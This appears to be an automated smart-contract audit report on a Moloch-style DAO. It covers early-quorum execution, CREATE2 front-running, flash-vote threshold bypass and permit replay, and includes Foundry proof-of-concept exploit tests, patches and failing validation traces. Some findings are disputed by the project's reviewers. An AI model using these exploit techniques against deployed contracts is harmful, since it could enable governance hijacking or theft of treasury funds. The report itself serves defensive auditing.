# Audited by [V12](https://v12.zellic.io/)

The only autonomous Solidity auditor that finds critical bugs. Not all audits are equal, so stop paying for bad ones. Just use V12. No calls, demos, or intros.

## Review Summary

> **Reviewed 2026-03-11. No production blockers identified.**
>
> - Zellic self-flagged as **Invalid**: #18, #17, #19, #21, #23, #24, #22, #16, #20 — we agree with all.
> - Zellic self-flagged as **Low-confidence**: #2, #1, #3, #7, #5, #6, #4 — we agree, none actionable.
> - Of the confident findings: **#12** is a false positive (per-receipt execution is by design). **#13** is a known quirk (cap is a soft guardrail, not a hard limit). **#8** is very low likelihood (requires permit/proposal ID collision).
> - **#9, #11, #15, #10** are valid observations suitable for future version hardening.
> - **No patches required for deployed contracts.** UI/documentation mitigations are sufficient.

---

# Early quorum bypasses voting window
**#7**
- Severity: Critical
- Validity: Low-confidence
> **Review: Accepted design tradeoff.** Fast execution when consensus is clear is intentional. Timelock provides the reaction window. Future versions could add an optional `minVotingPeriod`. UI should surface "voting still open" vs "quorum met" clearly.

## Targets
- castVote (Moloch)

## Affected Locations
- **Moloch.castVote**: Single finding location

## Description

`castVote` allows voting until `proposalTTL` expires and never checks the current proposal `state` or `queuedAt`, so votes remain open for the full TTL. At the same time, `state()` reads `tallies` and returns `Succeeded` or `Defeated` as soon as quorum and majority are met, without requiring the TTL to have elapsed. Any execution path that relies on `state()` (e.g., `executeByVotes`/queueing) can therefore be triggered immediately once early votes push `tallies` over quorum. After execution, `executed[id]` blocks further voting, so late voters are effectively shut out even though the voting period has not ended. This lets a fast coalition pass and execute proposals before the intended voting window closes.

## Root cause

The proposal lifecycle treats quorum attainment as a terminal state in `state()` while `castVote` keeps the voting window open until `proposalTTL` elapses, creating an ordering mismatch between tally updates and execution gating.

## Impact

An attacker who can reach quorum quickly can queue and execute a proposal before the voting period ends, bypassing the expected time for other voters to respond. Governance actions can be enacted with less participation than the DAO expects, enabling premature parameter changes or treasury movements. Late voters lose their opportunity to influence the outcome once execution occurs.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "src/Moloch.sol";

contract MolochHarnessTest is Test {
    function testEarlyQuorumBypassesVotingWindow() public {
        Moloch moloch = new Moloch();

        address attacker = vm.addr(1);
        address lateVoter = vm.addr(2);

        address[] memory holders = new address[](2);
        holders[0] = attacker;
        holders[1] = lateVoter;

        uint256[] memory shares = new uint256[](2);
        shares[0] = 60;
        shares[1] = 40;

        Call[] memory initCalls = new Call[](1);
        initCalls[0] = Call({
            target: address(moloch),
            value: 0,
            data: abi.encodeCall(Moloch.setProposalTTL, (7 days))
        });

        moloch.init("Org", "ORG", "", 2000, false, address(0), holders, shares, initCalls);

        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 1);

        bytes memory data = abi.encodeCall(Moloch.setRagequittable, (true));
        bytes32 nonce = keccak256("proposal-1");
        uint256 id = moloch.proposalId(0, address(moloch), 0, data, nonce);

        vm.prank(attacker);
        moloch.castVote(id, 1);

        uint64 createdAt = moloch.createdAt(id);
        assertLt(block.timestamp, createdAt + moloch.proposalTTL());
        assertEq(uint8(moloch.state(id)), uint8(Moloch.ProposalState.Succeeded));

        moloch.executeByVotes(0, address(moloch), 0, data, nonce);
        assertTrue(moloch.ragequittable());

        vm.prank(lateVoter);
        vm.expectRevert(Moloch.AlreadyExecuted.selector);
        moloch.castVote(id, 1);
    }
}
```

---

# Unbound CREATE2 salt enables DAO address hijack
**#9**
- Severity: Critical
- Validity: Not a bug
> **Review: Design tradeoff, low risk.** Salt commits to `initHolders`/`initShares`, so governance power can't be hijacked — only metadata can differ. Legitimate deployer re-deploys with a new salt. Consider binding to `msg.sender` in v2.

## Targets
- summon (Summoner)

## Affected Locations
- **Summoner.summon**: The function computes the CREATE2 salt from an incomplete set of inputs (and not `msg.sender`), so the deployed address is not cryptographically committed to the full intended configuration; binding the salt to `msg.sender` and/or all init parameters prevents front-running deployments with different initialization at the same address.

## Description

`Summoner.summon` derives the CREATE2 salt only from `initHolders`, `initShares`, and a user-supplied `salt`, then deploys the DAO at a deterministic address. Because the salt is not bound to `msg.sender` and does not commit to the full initialization/configuration parameters (for example `orgName`, `renderer`, governance settings, or `initCalls` executed during `Moloch.init`), multiple callers can race to deploy the same address with different configs. An attacker can copy the salt-affecting inputs from a pending transaction and submit their own `summon` with higher priority while changing the initialization data. The first mined transaction wins the deterministic address and sets the DAO’s configuration, while the original transaction subsequently reverts due to CREATE2 address collision. This creates a practical address-squatting and parameter-hijacking vector for any party relying on precomputed DAO addresses.

## Root cause

The CREATE2 salt is not bound to the deployer (`msg.sender`) and/or not committed to the complete initialization parameter set, allowing different callers to deploy the same deterministic address with different configurations.

## Impact

An attacker can front-run a legitimate deployment to claim the intended deterministic DAO address and initialize it with attacker-chosen metadata and initialization calls. This can block the intended deployer from using that address and cause users/integrations that precomputed or pre-funded the address to interact with an attacker-configured DAO, leading to governance confusion and potential asset loss if funds were sent based on the expected address.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "src/Moloch.sol";

contract SummonerFrontRunTest is Test {
    function testSummonFrontRunHijack() public {
        Summoner summoner = new Summoner();

        address attacker = address(0xA11CE);
        address victim = address(0xB0B);

        address[] memory initHolders = new address[](1);
        initHolders[0] = victim;
        uint256[] memory initShares = new uint256[](1);
        initShares[0] = 1;
        Call[] memory initCalls = new Call[](0);
        bytes32 userSalt = keccak256("user-supplied-salt");

        // Attacker front-runs with the same salt + holder data but different metadata.
        vm.prank(attacker);
        Moloch hijackedDao = summoner.summon(
            "AttackerDAO",
            "ATK",
            "",
            0,
            false,
            address(0),
            userSalt,
            initHolders,
            initShares,
            initCalls
        );

        // DAO at the deterministic address is initialized with attacker-controlled metadata.
        assertEq(hijackedDao.name(0), "AttackerDAO");

        // Victim tries to deploy the same deterministic DAO address with their own metadata.
        // This reverts because the address has already been claimed by the attacker.
        vm.prank(victim);
        vm.expectRevert(DeploymentFailed.selector);
        summoner.summon(
            "VictimDAO",
            "VIC",
            "",
            0,
            false,
            address(0),
            userSalt,
            initHolders,
            initShares,
            initCalls
        );

        assertEq(summoner.getDAOCount(), 1);
    }
}
```

## Remediation

**Status:** Error

### Explanation

Bind the CREATE2 salt to the caller and the full initialization data so only the intended deployer with the exact config can produce that address. Derive the salt from `msg.sender` plus a hash of all initialization parameters (or store a committed hash and require it on summon), and use that derived salt for CREATE2 so front‑running with different params cannot claim the same address.

### Error

Error code: 400 - {'error': {'message': 'Your input exceeds the context window of this model. Please adjust your input and try again.', 'type': 'invalid_request_error', 'param': 'input', 'code': 'context_length_exceeded'}}

---

# Threshold checked on current votes
**#11**
- Severity: Critical
- Validity: Not a bug
> **Review: Good hardening for v2, low practical risk.** Flash-loan threshold bypass only opens proposals — it cannot influence voting outcomes (which use snapshots). `proposalThreshold` is a spam-prevention gate, not a security-critical mechanism.

## Targets
- openProposal (Moloch)

## Affected Locations
- **Moloch.openProposal**: Single finding location

## Description

The proposal snapshot is taken at `block.number - 1`, but the `proposalThreshold` gate uses `_shares.getVotes(msg.sender)`, which returns the caller’s current voting power. That means the threshold is enforced on live votes rather than on the snapshot block that governs the proposal, a V‑5 style logic mismatch against the intended “past voting power” check. A caller can temporarily acquire votes in the current block (delegation or flash‑loan), pass the threshold, and open the proposal even if they had no votes at the snapshot block. The proposal then uses the previous block’s supply snapshot for voting and quorum, so the threshold gate is effectively bypassed. This weakens governance gating and allows low‑stake accounts to open proposals and trigger automatic side effects such as futarchy funding.

## Root cause

The threshold check uses `getVotes` (current block) instead of verifying voting power at the same snapshot block used for proposal state.

## Impact

Attackers can use transient voting power to satisfy `proposalThreshold` and open proposals without holding the required past voting power. This enables proposal spam and can trigger proposal‑opening side effects like futarchy pool allocations without long‑term stake. It undermines the intended protection that only established voters can initiate proposals.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "src/Moloch.sol";

contract MolochThresholdSnapshotTest is Test {
    function testThresholdUsesCurrentVotesNotSnapshot() public {
        Moloch dao = new Moloch();

        address alice = address(0xA11CE);
        address attacker = address(0xBEEF);

        address[] memory holders = new address[](1);
        holders[0] = alice;
        uint256[] memory shares = new uint256[](1);
        shares[0] = 100;

        dao.init("Org", "ORG", "", 0, false, address(0), holders, shares, new Call[](0));

        // Configure a proposal threshold via governance (DAO itself).
        vm.prank(address(dao));
        dao.setProposalThreshold(50);

        Shares sharesToken = dao.shares();

        bytes32 nonce = bytes32(uint256(1));
        uint256 proposalId = dao.proposalId(0, address(0x1234), 0, "", nonce);

        // Attacker has no votes and cannot open a proposal.
        vm.roll(100);
        vm.prank(attacker);
        vm.expectRevert(Unauthorized.selector);
        dao.openProposal(proposalId);

        // Alice temporarily transfers votes in the same block.
        vm.roll(100);
        vm.prank(alice);
        sharesToken.transfer(attacker, 50);

        // Snapshot block for the proposal will be 99 (previous block),
        // where attacker had no voting power.
        assertEq(sharesToken.getPastVotes(attacker, 99), 0);
        assertEq(sharesToken.getVotes(attacker), 50);

        // Attacker can now open the proposal due to current vote check,
        // despite having zero votes at the snapshot block.
        vm.roll(100);
        vm.prank(attacker);
        dao.openProposal(proposalId);

        assertEq(dao.snapshotBlock(proposalId), 99);
        assertEq(dao.proposerOf(proposalId), attacker);

        // Votes can be returned immediately after opening.
        vm.roll(100);
        vm.prank(attacker);
        sharesToken.transfer(alice, 50);
        assertEq(sharesToken.balanceOf(attacker), 0);
        assertEq(sharesToken.getVotes(attacker), 0);

        // Proposal remains opened even though attacker had no past votes.
        assertTrue(dao.snapshotBlock(proposalId) != 0);
    }
}
```

## Remediation

**Status:** Complete

### Explanation

Align the proposal threshold gate with the proposal snapshot by checking `getPastVotes` at `snap` before opening, preventing transient current-block voting power from satisfying `proposalThreshold`.

### Patch

```diff
diff --git a/src/Moloch.sol b/src/Moloch.sol
--- a/src/Moloch.sol
+++ b/src/Moloch.sol
@@ -280,14 +280,14 @@
 
         Shares _shares = shares;
 
+        uint48 snap = toUint48(block.number - 1);
         uint96 threshold = proposalThreshold;
         if (threshold != 0) {
-            require(_shares.getVotes(msg.sender) >= threshold, Unauthorized());
+            require(_shares.getPastVotes(msg.sender, snap) >= threshold, Unauthorized());
         }
 
         uint256 supply;
         unchecked {
-            uint48 snap = toUint48(block.number - 1);
             snapshotBlock[id] = snap;
             if (createdAt[id] == 0) createdAt[id] = uint64(block.timestamp);
```

### Affected Files

- `src/Moloch.sol`

### Validation Output

```
Compiling 21 files with Solc 0.8.30
Solc 0.8.30 finished in 17.19s
Compiler run successful!

Ran 1 test for test/MolochHarness.t.sol:MolochThresholdSnapshotTest
[FAIL: Unauthorized()] testThresholdUsesCurrentVotesNotSnapshot() (gas: 8102122)
Traces:
  [8102122] MolochThresholdSnapshotTest::testThresholdUsesCurrentVotesNotSnapshot()
    ├─ [7148249] → new Moloch@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
    │   ├─ [1560426] → new Shares@0x2f7B909A3F6D307EFe0FBEf251573258E14fE98D
    │   │   └─ ← [Return] 7794 bytes of code
    │   ├─ [866296] → new Badges@0x9450167788866079F440337Ca2aec30e4BA6284d
    │   │   └─ ← [Return] 4327 bytes of code
    │   ├─ [405435] → new Loot@0x06137Cb2273a7bB10B1E874D97a8d6cF61a0A5Ca
    │   │   └─ ← [Return] 2025 bytes of code
    │   └─ ← [Return] 21049 bytes of code
    ├─ [617276] Moloch::init("Org", "ORG", "", 0, false, 0x0000000000000000000000000000000000000000, [0x00000000000000000000000000000000000A11cE], [100], [])
    │   ├─ [9028] → new <unknown>@0x377810d97586F3085AE12882499C954c77325161
    │   │   └─ ← [Return] 45 bytes of code
    │   ├─ [22716] 0x377810d97586F3085AE12882499C954c77325161::init()
    │   │   ├─ [22561] Badges::init() [delegatecall]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   ├─ [9028] → new <unknown>@0x794b558a9d9F384aA191E3E439bB355d7F190Bb3
    │   │   └─ ← [Return] 45 bytes of code
    │   ├─ [333625] 0x794b558a9d9F384aA191E3E439bB355d7F190Bb3::init([0x00000000000000000000000000000000000A11cE], [100])
    │   │   ├─ [333434] Shares::init([0x00000000000000000000000000000000000A11cE], [100]) [delegatecall]
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x00000000000000000000000000000000000A11cE, amount: 100)
    │   │   │   ├─ emit DelegateChanged(delegator: 0x00000000000000000000000000000000000A11cE, fromDelegate: 0x0000000000000000000000000000000000000000, toDelegate: 0x00000000000000000000000000000000000A11cE)
    │   │   │   ├─ emit DelegateVotesChanged(delegate: 0x00000000000000000000000000000000000A11cE, previousBalance: 0, newBalance: 100)
    │   │   │   ├─ [141065] Moloch::onSharesChanged(0x00000000000000000000000000000000000A11cE)
    │   │   │   │   ├─ [139024] 0x377810d97586F3085AE12882499C954c77325161::onSharesChanged(0x00000000000000000000000000000000000A11cE)
    │   │   │   │   │   ├─ [138863] Badges::onSharesChanged(0x00000000000000000000000000000000000A11cE) [delegatecall]
    │   │   │   │   │   │   ├─ [312] Moloch::shares() [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x794b558a9d9F384aA191E3E439bB355d7F190Bb3
    │   │   │   │   │   │   ├─ [856] 0x794b558a9d9F384aA191E3E439bB355d7F190Bb3::balanceOf(0x00000000000000000000000000000000000A11cE) [staticcall]
    │   │   │   │   │   │   │   ├─ [692] Shares::balanceOf(0x00000000000000000000000000000000000A11cE) [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 100
    │   │   │   │   │   │   │   └─ ← [Return] 100
    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x00000000000000000000000000000000000A11cE, id: 1)
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   └─ ← [Return]
    │   │   │   │   └─ ← [Return]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   ├─ [9028] → new <unknown>@0x08520ccaFab8b17d6a1B3A56213c6113C95Dd09a
    │   │   └─ ← [Return] 45 bytes of code
    │   ├─ [22728] 0x08520ccaFab8b17d6a1B3A56213c6113C95Dd09a::init()
    │   │   ├─ [22573] Loot::init() [delegatecall]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   └─ ← [Return]
    ├─ [0] VM::prank(Moloch: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   └─ ← [Return]
    ├─ [23193] Moloch::setProposalThreshold(50)
    │   └─ ← [Return]
    ├─ [312] Moloch::shares() [staticcall]
    │   └─ ← [Return] 0x794b558a9d9F384aA191E3E439bB355d7F190Bb3
    ├─ [4371] Moloch::proposalId(0, 0x0000000000000000000000000000000000001234, 0, 0x, 0x0000000000000000000000000000000000000000000000000000000000000001) [staticcall]
    │   └─ ← [Return] 71905855550984701087984790861838634244936415781863663634952517400780108854900 [7.19e76]
    ├─ [0] VM::roll(100)
    │   └─ ← [Return]
    ├─ [0] VM::prank(0x000000000000000000000000000000000000bEEF)
    │   └─ ← [Return]
    ├─ [0] VM::expectRevert(custom error 0xc31eb0e0: 82b4290000000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return]
    ├─ [6626] Moloch::openProposal(71905855550984701087984790861838634244936415781863663634952517400780108854900 [7.19e76])
    │   ├─ [3031] 0x794b558a9d9F384aA191E3E439bB355d7F190Bb3::getPastVotes(0x000000000000000000000000000000000000bEEF, 99) [staticcall]
    │   │   ├─ [2861] Shares::getPastVotes(0x000000000000000000000000000000000000bEEF, 99) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   └─ ← [Revert] Unauthorized()
    ├─ [0] VM::roll(100)
    │   └─ ← [Return]
    ├─ [0] VM::prank(0x00000000000000000000000000000000000A11cE)
    │   └─ ← [Return]
    ├─ [237400] 0x794b558a9d9F384aA191E3E439bB355d7F190Bb3::transfer(0x000000000000000000000000000000000000bEEF, 50)
    │   ├─ [237230] Shares::transfer(0x000000000000000000000000000000000000bEEF, 50) [delegatecall]
    │   │   ├─ emit Transfer(from: 0x00000000000000000000000000000000000A11cE, to: 0x000000000000000000000000000000000000bEEF, amount: 50)
    │   │   ├─ emit DelegateChanged(delegator: 0x000000000000000000000000000000000000bEEF, fromDelegate: 0x0000000000000000000000000000000000000000, toDelegate: 0x000000000000000000000000000000000000bEEF)
    │   │   ├─ emit DelegateVotesChanged(delegate: 0x00000000000000000000000000000000000A11cE, previousBalance: 100, newBalance: 50)
    │   │   ├─ [5886] Moloch::onSharesChanged(0x00000000000000000000000000000000000A11cE)
    │   │   │   ├─ [3845] 0x377810d97586F3085AE12882499C954c77325161::onSharesChanged(0x00000000000000000000000000000000000A11cE)
    │   │   │   │   ├─ [3684] Badges::onSharesChanged(0x00000000000000000000000000000000000A11cE) [delegatecall]
    │   │   │   │   │   ├─ [312] Moloch::shares() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x794b558a9d9F384aA191E3E439bB355d7F190Bb3
    │   │   │   │   │   ├─ [856] 0x794b558a9d9F384aA191E3E439bB355d7F190Bb3::balanceOf(0x00000000000000000000000000000000000A11cE) [staticcall]
    │   │   │   │   │   │   ├─ [692] Shares::balanceOf(0x00000000000000000000000000000000000A11cE) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 50
    │   │   │   │   │   │   └─ ← [Return] 50
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   └─ ← [Return]
    │   │   │   └─ ← [Return]
    │   │   ├─ emit DelegateVotesChanged(delegate: 0x000000000000000000000000000000000000bEEF, previousBalance: 0, newBalance: 50)
    │   │   ├─ [97147] Moloch::onSharesChanged(0x000000000000000000000000000000000000bEEF)
    │   │   │   ├─ [95106] 0x377810d97586F3085AE12882499C954c77325161::onSharesChanged(0x000000000000000000000000000000000000bEEF)
    │   │   │   │   ├─ [94945] Badges::onSharesChanged(0x000000000000000000000000000000000000bEEF) [delegatecall]
    │   │   │   │   │   ├─ [312] Moloch::shares() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x794b558a9d9F384aA191E3E439bB355d7F190Bb3
    │   │   │   │   │   ├─ [856] 0x794b558a9d9F384aA191E3E439bB355d7F190Bb3::balanceOf(0x000000000000000000000000000000000000bEEF) [staticcall]
    │   │   │   │   │   │   ├─ [692] Shares::balanceOf(0x000000000000000000000000000000000000bEEF) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 50
    │   │   │   │   │   │   └─ ← [Return] 50
    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x000000000000000000000000000000000000bEEF, id: 2)
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   └─ ← [Return]
    │   │   │   └─ ← [Return]
    │   │   └─ ← [Return] true
    │   └─ ← [Return] true
    ├─ [1728] 0x794b558a9d9F384aA191E3E439bB355d7F190Bb3::getPastVotes(0x000000000000000000000000000000000000bEEF, 99) [staticcall]
    │   ├─ [1558] Shares::getPastVotes(0x000000000000000000000000000000000000bEEF, 99) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0) [staticcall]
    │   └─ ← [Return]
    ├─ [1376] 0x794b558a9d9F384aA191E3E439bB355d7F190Bb3::getVotes(0x000000000000000000000000000000000000bEEF) [staticcall]
    │   ├─ [1212] Shares::getVotes(0x000000000000000000000000000000000000bEEF) [delegatecall]
    │   │   └─ ← [Return] 50
    │   └─ ← [Return] 50
    ├─ [0] VM::assertEq(50, 50) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::roll(100)
    │   └─ ← [Return]
    ├─ [0] VM::prank(0x000000000000000000000000000000000000bEEF)
    │   └─ ← [Return]
    ├─ [5323] Moloch::openProposal(71905855550984701087984790861838634244936415781863663634952517400780108854900 [7.19e76])
    │   ├─ [1728] 0x794b558a9d9F384aA191E3E439bB355d7F190Bb3::getPastVotes(0x000000000000000000000000000000000000bEEF, 99) [staticcall]
    │   │   ├─ [1558] Shares::getPastVotes(0x000000000000000000000000000000000000bEEF, 99) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   └─ ← [Revert] Unauthorized()
    └─ ← [Revert] Unauthorized()

Backtrace:
  at Moloch.openProposal
  at MolochThresholdSnapshotTest.testThresholdUsesCurrentVotesNotSnapshot

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 3.99ms (2.65ms CPU time)

Ran 1 test suite in 28.53ms (3.99ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/MolochHarness.t.sol:MolochThresholdSnapshotTest
[FAIL: Unauthorized()] testThresholdUsesCurrentVotesNotSnapshot() (gas: 8102122)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test
```

---

# Permit receipts allow intent replay
**#12**
- Severity: Critical
- Validity: False positive
> **Review: False positive.** Per-receipt execution is by design. Permit receipts are fungible ERC-6909 tokens — if the DAO issues multiple receipts for an intent, it is authorizing multiple executions. Each holder independently burns their receipt and executes. The receipt balance decrement is the replay guard. Adding an `executed` guard would break the intended multi-holder permit model.

## Targets
- spendPermit (Moloch)
- setPermit (Moloch)
- executeByVotes (Moloch)

## Affected Locations
- **Moloch.spendPermit**: `spendPermit` executes solely based on `isPermitReceipt[tokenId]` and burns only one fungible receipt, but it never checks `!executed[tokenId]` (nor otherwise invalidates the `tokenId` globally), so the same intent can be executed again by any holder of remaining receipts.
- **Moloch.setPermit**: `setPermit` can mint multiple permit receipts for the same `tokenId`, creating multiple independently spendable balances that multiply the number of times the missing `executed`-guard in `spendPermit` can be exploited.
- **Moloch.executeByVotes**: `executeByVotes` participates in the intended single-use lifecycle by setting and respecting `executed[tokenId]`, but because `spendPermit` ignores this flag, intents marked executed (or effectively consumed) via voting can still be re-triggered through the permit path.

## Description

The permit execution path breaks the intended single-use lifecycle for an intent. `spendPermit` only checks `isPermitReceipt[tokenId]` and then proceeds to execute, but it never enforces that `executed[tokenId]` is still false before running the intent. Because permit receipts are fungible balances (ERC-6909 style) and `setPermit` can mint multiple receipts for the same `tokenId`, burning a single receipt does not invalidate other outstanding receipts. As a result, any remaining receipt holder can call `spendPermit` again and re-run the same underlying execution, even if the intent was already executed or canceled through the governance/voting path that relies on `executed` as a guard. The missing replay protection and lack of global invalidation for a `tokenId` permit receipt allow repeated execution of actions that were meant to happen once.

## Root cause

`spendPermit` does not gate execution on `!executed[tokenId]` and does not invalidate remaining permit receipts for that `tokenId`, so burning one fungible receipt is not sufficient replay protection.

## Impact

An attacker who obtains (or is minted) multiple receipts for the same intent can execute the underlying action multiple times. This can duplicate treasury transfers or repeat privileged calls/state changes that governance intended to be single-use, enabling fund loss or repeated configuration changes.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "src/Moloch.sol";

contract MolochPermitReplayTest is Test {
    function testPermitReceiptReplay() public {
        Moloch moloch = new Moloch();

        address alice = address(0xA11CE);
        address bob = address(0xB0B);
        address beneficiary = address(0xBEEF);

        uint8 op = 0; // call
        address to = beneficiary;
        uint256 value = 1 ether;
        bytes memory data = "";
        bytes32 nonce = keccak256("permit-nonce");

        Call[] memory initCalls = new Call[](2);
        initCalls[0] = Call({
            target: address(moloch),
            value: 0,
            data: abi.encodeWithSelector(
                Moloch.setPermit.selector,
                op,
                to,
                value,
                data,
                nonce,
                alice,
                1
            )
        });
        initCalls[1] = Call({
            target: address(moloch),
            value: 0,
            data: abi.encodeWithSelector(
                Moloch.setPermit.selector,
                op,
                to,
                value,
                data,
                nonce,
                bob,
                1
            )
        });

        address[] memory initHolders = new address[](0);
        uint256[] memory initShares = new uint256[](0);
        moloch.init("Org", "ORG", "", 0, false, address(0), initHolders, initShares, initCalls);

        // Fund the DAO so the permit can transfer ETH out.
        vm.deal(address(moloch), 2 ether);

        // First permit receipt holder executes the intent.
        vm.prank(alice);
        moloch.spendPermit(op, to, value, data, nonce);

        // Second permit receipt holder executes the same intent again.
        vm.prank(bob);
        moloch.spendPermit(op, to, value, data, nonce);

        // The beneficiary should only receive one transfer if the intent were single-use,
        // but the replay lets it execute twice.
        assertEq(beneficiary.balance, 1 ether, "intent replayed via extra permit receipt");
    }
}
```

## Remediation

**Status:** Complete

### Explanation

Add an `executed` guard in `spendPermit` to enforce single-use execution for a permit `tokenId`, preventing any remaining receipts from replaying the same intent after the first execution.

### Patch

```diff
diff --git a/src/Moloch.sol b/src/Moloch.sol
--- a/src/Moloch.sol
+++ b/src/Moloch.sol
@@ -664,6 +664,7 @@
     {
         uint256 tokenId = _intentHashId(op, to, value, data, nonce);
         require(isPermitReceipt[tokenId], Unauthorized());
+        if (executed[tokenId]) revert AlreadyExecuted();
 
         executed[tokenId] = true;
```

### Affected Files

- `src/Moloch.sol`

### Validation Output

```
Compiling 21 files with Solc 0.8.30
Solc 0.8.30 finished in 16.91s
Compiler run successful!

Ran 1 test for test/MolochHarness.t.sol:MolochPermitReplayTest
[FAIL: AlreadyExecuted()] testPermitReceiptReplay() (gas: 7626168)
Traces:
  [7626168] MolochPermitReplayTest::testPermitReceiptReplay()
    ├─ [7089972] → new Moloch@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
    │   ├─ [1560426] → new Shares@0x6077e8d1cf83C9CdcA38b161Bf4A32044e492B55
    │   │   └─ ← [Return] 7794 bytes of code
    │   ├─ [866296] → new Badges@0x8c829f91A1Be6121cF8C9a11c5d069E468CE6636
    │   │   └─ ← [Return] 4327 bytes of code
    │   ├─ [405435] → new Loot@0xB323cb98E0dEd0E45Abd5b21128B01e231540d2B
    │   │   └─ ← [Return] 2025 bytes of code
    │   └─ ← [Return] 20758 bytes of code
    ├─ [412753] Moloch::init("Org", "ORG", "", 0, false, 0x0000000000000000000000000000000000000000, [], [], [Call({ target: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, value: 0, data: 0x12374b040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000beef0000000000000000000000000000000000000000000000000de0b6b3a764000000000000000000000000000000000000000000000000000000000000000000e0ec1a522eab76eec1ecd63c61f54e410714fd88126a025b4ebfd887619af5b21a00000000000000000000000000000000000000000000000000000000000a11ce00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000 }), Call({ target: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, value: 0, data: 0x12374b040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000beef0000000000000000000000000000000000000000000000000de0b6b3a764000000000000000000000000000000000000000000000000000000000000000000e0ec1a522eab76eec1ecd63c61f54e410714fd88126a025b4ebfd887619af5b21a0000000000000000000000000000000000000000000000000000000000000b0b00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000 })])
    │   ├─ [9028] → new <unknown>@0xd2A477552b58D32e28aCfBeBcc8f3169bD047177
    │   │   └─ ← [Return] 45 bytes of code
    │   ├─ [22716] 0xd2A477552b58D32e28aCfBeBcc8f3169bD047177::init()
    │   │   ├─ [22561] Badges::init() [delegatecall]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   ├─ [9028] → new <unknown>@0x63060105980E24c533E4289E0b2ec74D109E2F58
    │   │   └─ ← [Return] 45 bytes of code
    │   ├─ [23359] 0x63060105980E24c533E4289E0b2ec74D109E2F58::init([], [])
    │   │   ├─ [23180] Shares::init([], []) [delegatecall]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   ├─ [9028] → new <unknown>@0xb353fF46b04bdcB22cbeD1FE60671Ff505674424
    │   │   └─ ← [Return] 45 bytes of code
    │   ├─ [22728] 0xb353fF46b04bdcB22cbeD1FE60671Ff505674424::init()
    │   │   ├─ [22573] Loot::init() [delegatecall]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   ├─ [74860] Moloch::setPermit(0, 0x000000000000000000000000000000000000bEEF, 1000000000000000000 [1e18], 0x, 0xec1a522eab76eec1ecd63c61f54e410714fd88126a025b4ebfd887619af5b21a, 0x00000000000000000000000000000000000A11cE, 1)
    │   │   ├─ emit Transfer(caller: Moloch: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], from: 0x0000000000000000000000000000000000000000, to: 0x00000000000000000000000000000000000A11cE, id: 22381582320559696737622307053258675683844895773635009021500122020590908876487 [2.238e76], amount: 1)
    │   │   ├─ emit PermitSet(spender: 0x00000000000000000000000000000000000A11cE, id: 22381582320559696737622307053258675683844895773635009021500122020590908876487 [2.238e76], newCount: 1)
    │   │   └─ ← [Return]
    │   ├─ [29060] Moloch::setPermit(0, 0x000000000000000000000000000000000000bEEF, 1000000000000000000 [1e18], 0x, 0xec1a522eab76eec1ecd63c61f54e410714fd88126a025b4ebfd887619af5b21a, 0x0000000000000000000000000000000000000B0b, 1)
    │   │   ├─ emit Transfer(caller: Moloch: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], from: 0x0000000000000000000000000000000000000000, to: 0x0000000000000000000000000000000000000B0b, id: 22381582320559696737622307053258675683844895773635009021500122020590908876487 [2.238e76], amount: 1)
    │   │   ├─ emit PermitSet(spender: 0x0000000000000000000000000000000000000B0b, id: 22381582320559696737622307053258675683844895773635009021500122020590908876487 [2.238e76], newCount: 1)
    │   │   └─ ← [Return]
    │   └─ ← [Return]
